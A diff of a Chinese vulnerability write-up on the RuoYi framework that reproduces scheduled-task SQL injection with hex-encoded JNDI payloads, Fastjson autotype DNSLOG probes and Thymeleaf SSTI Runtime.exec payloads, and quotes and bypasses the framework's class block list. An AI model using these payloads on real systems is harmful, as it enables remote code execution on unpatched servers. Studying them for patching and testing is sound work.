+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN5qWwjO06ZichoTBvHDeK3huYSS3tdord15K3zZWKOibRKiabuciaKEerEQ/640?wx_fmt=png&from=appmsg "")  
 ## 0x05 漏洞复现  
   
 系统监控下定时任务中存在SQL注入漏洞  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVRw21MrvdZVcrYuVuseZfQicIHsygutEmHM2tsBld0HZMDuvYflKX6bw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNuSKINZfv78zeDnstfGvDmPBzugNDBwxablB9cBUfULI29MVGSA6Uuw/640?wx_fmt=png&from=appmsg "")  
   
 在补丁中，使用了黑名单和白名单的策略。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV6EOnnWI4rTxdibAA1nwuG9ceE9YSFgqZNTnvJicugIhSqF6pwgQYYH9Q/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNjwrDGAs7LPeQzshyzsLQnDPJAcIC5N9Qk1Ut6lVbsDoxLEQ4TEw2cg/640?wx_fmt=png&from=appmsg "")  
   
 SQL注入漏洞点  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVzviaKmsGulV7pTibhibhSJyiadEB1Iwne59YeEVeSecArFrtleRrg0ky5A/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN71b8iaCBUe9Iic3aoAcFPKoPs07xNzIia9VXktXPpCLicW0EDtkb5Y8nZg/640?wx_fmt=png&from=appmsg "")  
   
   
 开始复现  
+  
 RCE payload  
+  
 JNDI  
 ```
 javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')
 ```  
   
 payload中可以执行反弹shell、漏洞探测、命令执行功能  
+  
 DNSLOG  
 ```
 javax.naming.InitialContext.lookup('ldap://dnslog')
 ```  
   
 目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改  
+  
 https://www.bejson.com/convert/ox2str/  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVAu4yt0VLdRVKtIxWpjhGWiaWBrNrgic0fQpKC2SQrsbwiaHVzkKYiaQqVQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNXPG84mhVzfEXcbGOULWicl0QiaTGrtZBbNuzlSt8vOic8sJmjqUFHTNKg/640?wx_fmt=png&from=appmsg "")  
 ```
 6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729
 ```  
   
 第一步：运行此命令  
+  
 成功地绕过了它，并成功地执行  
 ```
 genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
 ```  
-<table><tbody><tr style="height: 33px;"><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td></tr><tr style="height: 33px;"><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">分钟</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">小时</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">日</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">月</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">星期</span></span></p></td></tr></tbody></table>```
+<table><tbody><tr style="height: 33px;"><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><section><span leaf=""><br/></span></section></td></tr><tr style="height: 33px;"><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">分钟</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">小时</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">日</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">月</span></span></p></td><td data-colwidth="150" width="150" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">星期</span></span></p></td></tr></tbody></table>```
 * * * * * ?
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVkInNfRdyCwColzCeUDHB5DulmGOMQwW25bJicZlLKI0Jtnm3HLMyq4g/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN9TiamK3locEU4jIu0jqjgDmjQbYbR4dagonsfzhuGEAqsYpMhvGZ1iaA/640?wx_fmt=png&from=appmsg "")  
   
 第二步：  
+  
 修改执行命令  
 ```
 genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVnXic5pfFooTzxqAXOtmFVibtMpIEvsL4MicDyQBXwnGmxy5AOGhYpecwQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNa180qF1ka5cZ1JhlhaNrTfhAQ9yzJgkNq7GAdj95ib4JZGEA6VR0ucQ/640?wx_fmt=png&from=appmsg "")  
   
 第三步：  
 ```
@@ -434,42 +422,47 @@ genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a61766178
   
 创建任务  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVb08lurKfjhIDKwUeLECEQp5ib3PjxgWye9iacficrCvAtBPK8bGgxdLNg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN11GezsZSNdL5ic6icyia3c0AXL4afNMUfId8icjTYvg4P28jbuCEffHQ6w/640?wx_fmt=png&from=appmsg "")  
   
   
 执行一次  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVx1N5RqyNMTXPGHT0icfXjS4ENmyLtMjNIP1O4xLVHN6gX2jKfMqYpKg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNCDiaCLKz1GxZtibWXgrFAOsgFzo9JaiaLm2HaJGqwmPRIrrxECpgdyDAg/640?wx_fmt=png&from=appmsg "")  
   
   
 执行被修改的任务之前需要开启JNDI  
+  
 需要下载cckuailong师傅的JNDI-Injection-Exploit-Plus项目(  
 https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases/tag/2.3  
 )。  
+  
 jdk版本要求1.8  
 ```
 java -jar '.\JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar' -C calc -A 127.0.0.1
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVRvfucY2s7ib3PbY8o70l0Tib9tXNuzNtNfaE5vCY9DC4kRfR0TAAau8w/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNuArqg8cUPEuCHicnfVBss6s8mWt3YJ3StibRVaTAus6IhEGqGbGpsCHA/640?wx_fmt=png&from=appmsg "")  
   
   
 执行被修改的1任务  
+  
 JNDI  
 ```
 javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')
 ```  
   
 payload中可以执行反弹shell、漏洞探测、命令执行功能  
+  
 DNSLOG  
 ```
 javax.naming.InitialContext.lookup('ldap://dnslog')
 ```  
   
 目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改  
+  
 https://www.bejson.com/convert/ox2str/  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVAu4yt0VLdRVKtIxWpjhGWiaWBrNrgic0fQpKC2SQrsbwiaHVzkKYiaQqVQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNXPG84mhVzfEXcbGOULWicl0QiaTGrtZBbNuzlSt8vOic8sJmjqUFHTNKg/640?wx_fmt=png&from=appmsg "")  
 ```
 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7263793870732e646e736c6f672e636e2729
 ```  
@@ -477,27 +470,28 @@ https://www.bejson.com/convert/ox2str/
 genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV8jKzbTQV0icdohUe7XA7icLlGRx7q8CDbjZUlHDH01FwoUm11ibicVPAKA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNlNf2icME9x5YvUIDslM3ib01MJkvGja7qAMn4fr8via7QZLyOeaeQZBKg/640?wx_fmt=png&from=appmsg "")  
   
 我们再来试试dnslog  
 ```
 javax.naming.InitialContext.lookup('ldap://rcy8ps.dnslog.cn')
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVHtCWHibrmU5Y38Be88hibiaYqD3xibACbwmcBl4iazibYOjdh5OQT5wMh4kA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNmiab1wtS5IyX3nIfg2TQCrd9YEAhmRUR5eYEuNN38RNicjxxHrxIJMnw/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVNOppMZibvopTnQytven76zO4bGtNcaKpvAYyV6mMD4TFJmoEIQFoalA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN10QkKgJMJImFULQVmPQ4F2KojJDicOdZINiao71v11cQHICpnUZ763Xg/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVHYDNT9yA8J4rYribJLdwyGJL6scUcdXhhNnlCibBKWMwp1OStyMXGQIg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNZECpCia9WqEXnRiaBicBIoV0aDZhPqT5taMy1DY8waXgMwDjAEwAicWFibA/640?wx_fmt=png&from=appmsg "")  
   
 工具使用：  
+  
 https://github.com/charonlight/RuoYiExploitGUI  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVHOXJkkicVkEtjjWrpr2Qib90xiaC21SbVvNibV0EWvecEfx8miamudCbmrg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNluQos7AHgA9nOMr9jCZkVeo495UrV2Ep3ibp2XVa6gWPYSib0LU9eia6g/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVtLNDRNE7YypFwLR4GiaPjk4fermSs6QdLXiaSzKhM3SehVxib2ibEbwU4g/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNjxXOfNQJjDFALeqBS2ibk62AnVNOC0zV89L9aOsUsXJZaluUZ5xs4ug/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVw51aXb5U4BJMP5ZUC9GPtJicD4lhgQ5MYS19DicKrQTZLFAicibMeDBOKQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNuVuibkiaQ200MSmYLib42Z0fk1PkqlkFlZOmn9BN6f2bDd4m135nicmdBw/640?wx_fmt=png&from=appmsg "")  
 ## 0x06 修复方式  
   
 1、升级版本。  
@@ -517,11 +511,11 @@ org.yaml.snakeyaml.Yaml.load(’!!javax.script.ScriptEngineManager [!!java.net.U
   
 关注两个函数 parse 和 parseObject JSONObject.parse  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVtozfOgecwIGayADnIjia5UblL8zHN0cB8w2F56DibW5kM01KpjsicBpyQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNzpJg03M1syXM39QM1sA8HQ1lCBHcUBAm1O5ictrm9NOGJTibbSSLyvbA/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVEo5H3NRA0bickUNPt2R5g9XqgLO2mNjibeL3SUuG5t4JZBqo4bfHUUibw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNiaN13WicFvqooicgfGO7AiclYotzfrKmnicPcPItPhhq1Cqftjw4Zt96Whw/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVgKEa2fdlWfvIDbKpUJmB4iaqZWoaZDKnq7Eyc0u9wN4TrfK0JUrTQicQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN2lQHjJVia1mmibjyONxl0hlOIurMk8M8YULtjjTic4ibGvG4ENI9eWS8MA/640?wx_fmt=png&from=appmsg "")  
   
   
 开启 autotype  
@@ -539,25 +533,13 @@ tplCategory
   
 最终简化后的数据包如下  
 ```
-POST /tool/gen/edit HTTP/1.1
-Host: 172.16.0.66
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
-Referer: http://172.16.0.66/tool/gen/edit/6
-Cookie: JSESSIONID=c229803b-e147-4853-ae79-df7e04dcd338
-X-Requested-With: XMLHttpRequest
-Accept: application/json, text/javascript, */*; q=0.01
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Origin: http://172.16.0.66
-Accept-Language: zh-CN,zh;q=0.9
-Content-Length: 3610
-
-tableName=111111&tableComment=111111&className=111111&functionAuthor=111111&&columns[0].javaType=Long&columns[0].javaField=infoId&&tplCategory=tree&treeCode=111111&treeParentCode=111111&packageName=111111&moduleName=111111&businessName=111111&functionName=111111&params[treeCode]=111111&params[treeParentCode]=1&params[treeName]={"@type":"java.net.Inet4Address","val":"11.hb4r0s.dnslog.cn"}
+POST /tool/gen/edit HTTP/1.1Host: 172.16.0.66User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36Referer: http://172.16.0.66/tool/gen/edit/6Cookie: JSESSIONID=c229803b-e147-4853-ae79-df7e04dcd338X-Requested-With: XMLHttpRequestAccept: application/json, text/javascript, */*; q=0.01Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://172.16.0.66Accept-Language: zh-CN,zh;q=0.9Content-Length: 3610tableName=111111&tableComment=111111&className=111111&functionAuthor=111111&&columns[0].javaType=Long&columns[0].javaField=infoId&&tplCategory=tree&treeCode=111111&treeParentCode=111111&packageName=111111&moduleName=111111&businessName=111111&functionName=111111&params[treeCode]=111111&params[treeParentCode]=1&params[treeName]={"@type":"java.net.Inet4Address","val":"11.hb4r0s.dnslog.cn"}
 ```  
 # 0x08 SSTI模版注入漏洞  
 #### 漏洞版本  
   
 在4.7.1版本CacheController类中  
+  
 ![[../S24-25赛季-大黑客之路/红队知识学习/assets/Y10 若依ruoyi/file-20250416135654610.png]]  
 #### 漏洞复现  
   
@@ -585,9 +567,7 @@ ${T(java.lang.Runtime).getRuntime().exec("touch test")}::.x
 直接贴出来了，大家测试的时候记得进行URL  
 编码。  
 ```
-POST /monitor/cache/getNames HTTP/1.1
-
-fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a calculator')}__::.x
+POST /monitor/cache/getNames HTTP/1.1fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a calculator')}__::.x
 ```  
 ```
 cacheName=123&fragment=${T (java.lang.Runtime).getRuntime().exec(“calc.exe”)}
@@ -604,14 +584,14 @@ https://github.com/yangzongzhuan/RuoYi/releases
   
 修改application中的文件路径及log存放路径  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVFDw7BYoyibiabHd98401MnhPT20tyZqDVweUmfAJ8wMUuP30taebTPaA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNHDbOojDzUGBRBctib3SFVkwvap8WiaxDqdQpDAHGUNIUTm8xTHITvkhQ/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTViahol0sPRquCGb4UJ4ecMyibujY4pib5YH531FPBN8dygDlZmwfERicNww/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNERUviaLu9zPhABjIOFL5CB7pXBM2iboIs4cdLy5LPazrRiblnIjUoPKDw/640?wx_fmt=png&from=appmsg "")  
   
   
 启动成功  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVQMYh7mDibGEbjlM15A1VXVbq82e5hdzG6w79a1ewSD8z7h9TWelribuA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNFYCUgMw8sXny5h2JMTb5O7mvh7YdnsogZZxrBNiavoDxHNHxaswMmAA/640?wx_fmt=png&from=appmsg "")  
 ## 漏洞分析  
   
 最新版本4.8 Ruoyi 后台⽬前限制  
@@ -639,20 +619,10 @@ xxx.com.ruoyi.quartz.task.yyy.EvilClass
 com.ruoyi.quartz.task  
 ，可绕过白名单。  
 ```
-/**  
-     * 定时任务白名单配置（仅允许访问的包名，如其他需要可以自行添加）  
-     */  
-    public static final String[] JOB_WHITELIST_STR = { "com.ruoyi.quartz.task" };  
-
-    /**  
-     * 定时任务违规的字符  
-     */  
-    public static final String[] JOB_ERROR_STR = { "java.net.URL", "javax.naming.InitialContext", "org.yaml.snakeyaml",  
-            "org.springframework", "org.apache", "com.ruoyi.common.utils.file", "com.ruoyi.common.config", "com.ruoyi.generator" };  
-}
+/**       * 定时任务白名单配置（仅允许访问的包名，如其他需要可以自行添加）       */      public static final String[] JOB_WHITELIST_STR = { "com.ruoyi.quartz.task" };      /**       * 定时任务违规的字符       */      public static final String[] JOB_ERROR_STR = { "java.net.URL", "javax.naming.InitialContext", "org.yaml.snakeyaml",              "org.springframework", "org.apache", "com.ruoyi.common.utils.file", "com.ruoyi.common.config", "com.ruoyi.generator" };  }
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVGyfPU3sWBCw7HRHc5613LvbjDLKUhadxV4C31AL2xC4omibafHZrBrw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNjpx55BzzjhRK38nl074h9ic7DQZrzibuI9dSnJoW5WlWSr6C4UKaPuSg/640?wx_fmt=png&from=appmsg "")  
   
   
 JOB_WHITELIST_STR 这个也就是com.ruoyi.quartz.task 其实不⽤类名 包含在⾃符串⾥⾯就⾏ 这⾥是invokeTarget⽽不是beanPackageName  
@@ -674,24 +644,11 @@ com.ruoyi.common.utils
 JOB_ERROR_STR  
   
 禁止的子包中）。  
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVTnVicMeF8F6yhCAg8Rps1st2XGzZIwx2rUG6fQueeq42NYKmUKeic5Qw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNibpMtDjforoUUqnby0Tib8ZYIoQMCcibaGdxWPu7bKZmYPW1eL0J5ia14w/640?wx_fmt=png&from=appmsg "")  
   
 **白名单检查（**whiteList******方法）**  
 ```
-public static boolean whiteList(String invokeTarget)  
-    {  
-        String packageName = StringUtils.substringBefore(invokeTarget, "(");  
-        int count = StringUtils.countMatches(packageName, ".");  
-        if (count > 1)  
-        {  
-            return StringUtils.containsAnyIgnoreCase(invokeTarget, Constants.JOB_WHITELIST_STR);  
-        }  
-        Object obj = SpringUtils.getBean(StringUtils.split(invokeTarget, ".")[0]);  
-        String beanPackageName = obj.getClass().getPackage().getName();  
-        return StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_WHITELIST_STR)  
-                && !StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_ERROR_STR);  
-    }  
-}
+public static boolean whiteList(String invokeTarget)      {          String packageName = StringUtils.substringBefore(invokeTarget, "(");          int count = StringUtils.countMatches(packageName, ".");          if (count > 1)          {              return StringUtils.containsAnyIgnoreCase(invokeTarget, Constants.JOB_WHITELIST_STR);          }          Object obj = SpringUtils.getBean(StringUtils.split(invokeTarget, ".")[0]);          String beanPackageName = obj.getClass().getPackage().getName();          return StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_WHITELIST_STR)                  && !StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_ERROR_STR);      }  }
 ```  
 - **漏洞点**  
 ：当  
@@ -702,171 +659,100 @@ a.b.c.method
 ），仅检查是否包含白名单字符串，而非完整包路径。  
 然后不⽤JOB_ERROR_STR 这个类⾥⾯的 从mvn install 后 从其他包下⾯去寻找可利⽤的类下的⽅法就⾏  
   
-需要满⾜以下条件**方法参数解析（**getMethodParams**）**  
+需要满⾜以下条件  
+**方法参数解析（**getMethodParams**）**  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVQqupb3KYHcrQaCo1gglAJAYxKGlbPYbpZuTHowibSE1tKU7WicicN6fKw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN2WKC3xGibOVgxicxLXLmHYWgWyfvNYcNLIoO4ia1ia2nvPATAgib3dQCe5Q/640?wx_fmt=png&from=appmsg "")  
 ```
-public static List<Object[]> getMethodParams(String invokeTarget)  
-{  
-    String methodStr = StringUtils.substringBetween(invokeTarget, "(", ")");  
-    if (StringUtils.isEmpty(methodStr))  
-    {  
-        return null;  
-    }  
-    String[] methodParams = methodStr.split(",(?=([^\"']*[\"'][^\"']*[\"'])*[^\"']*$)");  
-    List<Object[]> classs = new LinkedList<>();  
-    for (int i = 0; i < methodParams.length; i++)  
-    {  
-        String str = StringUtils.trimToEmpty(methodParams[i]);  
-        // String字符串类型，以'或"开头  
-        if (StringUtils.startsWithAny(str, "'", "\""))  
-        {  
-            classs.add(new Object[] { StringUtils.substring(str, 1, str.length() - 1), String.class });  
-        }  
-        // boolean布尔类型，等于true或者false  
-        else if ("true".equalsIgnoreCase(str) || "false".equalsIgnoreCase(str))  
-        {  
-            classs.add(new Object[] { Boolean.valueOf(str), Boolean.class });  
-        }  
-        // long长整形，以L结尾  
-        else if (StringUtils.endsWith(str, "L"))  
-        {            classs.add(new Object[] { Long.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Long.class });  
-        }  
-        // double浮点类型，以D结尾  
-        else if (StringUtils.endsWith(str, "D"))  
-        {  
-            classs.add(new Object[] { Double.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Double.class });  
-        }  
-        // 其他类型归类为整形  
-        else  
-        {  
-            classs.add(new Object[] { Integer.valueOf(str), Integer.class });  
-        }  
-    }  
-    return classs;  
-}
+public static List<Object[]> getMethodParams(String invokeTarget)  {      String methodStr = StringUtils.substringBetween(invokeTarget, "(", ")");      if (StringUtils.isEmpty(methodStr))      {          return null;      }      String[] methodParams = methodStr.split(",(?=([^\"']*[\"'][^\"']*[\"'])*[^\"']*$)");      List<Object[]> classs = new LinkedList<>();      for (int i = 0; i < methodParams.length; i++)      {          String str = StringUtils.trimToEmpty(methodParams[i]);          // String字符串类型，以'或"开头          if (StringUtils.startsWithAny(str, "'", "\""))          {              classs.add(new Object[] { StringUtils.substring(str, 1, str.length() - 1), String.class });          }          // boolean布尔类型，等于true或者false          else if ("true".equalsIgnoreCase(str) || "false".equalsIgnoreCase(str))          {              classs.add(new Object[] { Boolean.valueOf(str), Boolean.class });          }          // long长整形，以L结尾          else if (StringUtils.endsWith(str, "L"))          {            classs.add(new Object[] { Long.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Long.class });          }          // double浮点类型，以D结尾          else if (StringUtils.endsWith(str, "D"))          {              classs.add(new Object[] { Double.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Double.class });          }          // 其他类型归类为整形          else          {              classs.add(new Object[] { Integer.valueOf(str), Integer.class });          }      }      return classs;  }
 ```  
 - **限制**  
 ：参数类型被强制约束为基本类型，无法传递复杂对象。  
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV1kOsNfMFtVpl0ODEgZ5vIAlbqz9273I0zpaGiaRAFWX6KFKUVn9Jtrw/640?wx_fmt=png&from=appmsg "")  
